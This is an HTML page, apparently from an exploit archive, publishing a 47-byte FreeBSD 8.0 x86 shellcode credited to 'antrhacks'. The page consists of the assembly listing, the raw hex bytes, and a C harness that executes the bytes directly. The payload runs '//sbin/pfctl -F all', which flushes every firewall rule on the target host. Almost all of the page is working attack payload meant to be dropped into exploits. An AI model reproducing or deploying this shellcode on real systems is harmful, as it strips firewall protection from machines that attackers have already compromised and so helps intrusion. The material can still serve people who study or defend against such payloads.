<html><head><title>FreeBSD/x86 - 8.0-RELEASE/x86 - //sbin/pfctl -F all Shellcode 47 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 * Title: FreeBSD 8.0-RELEASE/x86 '//sbin/pfctl -F all Shellcode 47 Bytes'
 * Type: Shellcode
 * Author: antrhacks
 * Platform: FreeBSD 8.0-RELEASE
*/

/* ASSembly
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 2d 46 61 6c       	push   $0x6c61462d
 89 e1                	mov    %esp,%ecx
 50                   	push   %eax
 68 66 63 74 6c       	push   $0x6c746366
 68 69 6e 2f 70       	push   $0x702f6e69
 68 2f 2f 73 62       	push   $0x62732f2f
 89 e3                	mov    %esp,%ebx
 50                   	push   %eax
 51                   	push   %ecx
 53                   	push   %ebx
 89 e1                	mov    %esp,%ecx
 50                   	push   %eax
 51                   	push   %ecx
 53                   	push   %ebx
 b0 3b                	mov    $0x3b,%al
 50                   	push   %eax
 cd 80                	int    $0x80
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 50                   	push   %eax
 cd 80                	int    $0x80
*/


#include &lt;stdio.h&gt;

int main(){
char shellcode[] = &quot;\x31\xc0\x50\x68\x2d\x46\x61\x6c\x89\xe1\x50\x68\x66\x63\x74\x6c&quot;
&quot;\x68\x69\x6e\x2f\x70\x68\x2f\x2f\x73\x62\x89\xe3\x50\x51\x53&quot;
&quot;\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80\x31\xc0\x50\x50\xcd\x80&quot;; 

 printf(&quot;[*] ShellCode size (bytes): %d\n\n&quot;, sizeof(shellcode)-1 );

(*(void (*)())shellcode)();

return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
